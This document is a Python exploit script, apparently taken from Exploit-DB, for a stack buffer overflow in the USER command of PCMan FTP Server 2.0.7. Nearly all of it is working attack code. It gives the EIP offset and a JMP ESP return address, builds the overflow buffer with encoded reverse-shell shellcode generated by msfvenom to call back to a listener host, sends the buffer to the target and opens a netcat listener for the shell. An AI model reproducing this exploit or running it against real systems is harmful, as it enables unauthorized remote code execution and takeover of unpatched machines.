#!/usr/bin/env python
#---------------------------------------------------------------------------------------------#
# Software      = PCMan FTP Server 2.0.7 - 'USER'                                             #
# Download Link = https://www.exploit-db.com/apps/9fceb6fefd0f3ca1a8c36e97b6cc925d-PCMan.7z   #
# Date          = 12/28/2018                                                                  #
# Reference     = https://www.exploit-db.com/exploits/26471/                                  #
# Author        = @Anakein                                                                    #
# Tested on     = Windows 7 Ultimate SP1                                                      #
# EIP Offset    = 2004                                                                        #
# Badchars      = "\x00\x0A\x0D"                                                              #
# RET Address   = 0x7cb32d69 : "\xFF\xE4" | [SHELL32.dll]                                     #
# Usage         = python exploit.py <target IP> <port>                                        #        
#---------------------------------------------------------------------------------------------#

import socket as so
import time
import struct
import sys
import subprocess

try:
    server = str(sys.argv[1])
    port   = int(sys.argv[2])

except IndexError:
    print("Usage: python %s 10.0.1.117 21" % sys.argv[0])
    sys.exit()

crash = 3000
offset = 2004

#msfvenom -p windows/shell_reverse_tcp LHOST=10.0.1.103 LPORT=1337 -f python -e x86/shikata_ga_nai -b "\x00\x0a\x0d" EXECFUNC=thread

buf  = '\x41'*offset
buf += struct.pack("<L", 0x7cb32d69)
buf += '\x90'*26
buf += "\xb8\x22\x24\xc7\xba\xda\xc8\xd9\x74\x24\xf4\x5b\x29"
buf += "\xc9\xb1\x52\x83\xeb\xfc\x31\x43\x0e\x03\x61\x2a\x25"
buf += "\x4f\x99\xda\x2b\xb0\x61\x1b\x4c\x38\x84\x2a\x4c\x5e"
buf += "\xcd\x1d\x7c\x14\x83\x91\xf7\x78\x37\x21\x75\x55\x38"
buf += "\x82\x30\x83\x77\x13\x68\xf7\x16\x97\x73\x24\xf8\xa6"
buf += "\xbb\x39\xf9\xef\xa6\xb0\xab\xb8\xad\x67\x5b\xcc\xf8"
buf += "\xbb\xd0\x9e\xed\xbb\x05\x56\x0f\xed\x98\xec\x56\x2d"
buf += "\x1b\x20\xe3\x64\x03\x25\xce\x3f\xb8\x9d\xa4\xc1\x68"
buf += "\xec\x45\x6d\x55\xc0\xb7\x6f\x92\xe7\x27\x1a\xea\x1b"
buf += "\xd5\x1d\x29\x61\x01\xab\xa9\xc1\xc2\x0b\x15\xf3\x07"
buf += "\xcd\xde\xff\xec\x99\xb8\xe3\xf3\x4e\xb3\x18\x7f\x71"
buf += "\x13\xa9\x3b\x56\xb7\xf1\x98\xf7\xee\x5f\x4e\x07\xf0"
buf += "\x3f\x2f\xad\x7b\xad\x24\xdc\x26\xba\x89\xed\xd8\x3a"
buf += "\x86\x66\xab\x08\x09\xdd\x23\x21\xc2\xfb\xb4\x46\xf9"
buf += "\xbc\x2a\xb9\x02\xbd\x63\x7e\x56\xed\x1b\x57\xd7\x66"
buf += "\xdb\x58\x02\x28\x8b\xf6\xfd\x89\x7b\xb7\xad\x61\x91"
buf += "\x38\x91\x92\x9a\x92\xba\x39\x61\x75\xcf\xbd\x68\xe2"
buf += "\xa7\xbf\x6a\xe9\x0e\x49\x8c\x9b\x60\x1f\x07\x34\x18"
buf += "\x3a\xd3\xa5\xe5\x90\x9e\xe6\x6e\x17\x5f\xa8\x86\x52"
buf += "\x73\x5d\x67\x29\x29\xc8\x78\x87\x45\x96\xeb\x4c\x95"
buf += "\xd1\x17\xdb\xc2\xb6\xe6\x12\x86\x2a\x50\x8d\xb4\xb6"
buf += "\x04\xf6\x7c\x6d\xf5\xf9\x7d\xe0\x41\xde\x6d\x3c\x49"
buf += "\x5a\xd9\x90\x1c\x34\xb7\x56\xf7\xf6\x61\x01\xa4\x50"
buf += "\xe5\xd4\x86\x62\x73\xd9\xc2\x14\x9b\x68\xbb\x60\xa4"
buf += "\x45\x2b\x65\xdd\xbb\xcb\x8a\x34\x78\xfb\xc0\x14\x29"
buf += "\x94\x8c\xcd\x6b\xf9\x2e\x38\xaf\x04\xad\xc8\x50\xf3"
buf += "\xad\xb9\x55\xbf\x69\x52\x24\xd0\x1f\x54\x9b\xd1\x35"

buffer = buf

try:
    print("Connecting in host %s" % server)
    s = so.socket(so.AF_INET, so.SOCK_STREAM)
    s.connect((server, port))
    s.recv(1024)
    print("Sending payload!!!")
    s.send('USER ' + buffer + '\r\n')
    print("Incoming shell")
    subprocess.call(['nc -lvp 1337'], shell=True)

except Exception,msg:
    print("Check you connection: nc <ip_server> <port>")
    sys.exit(0)
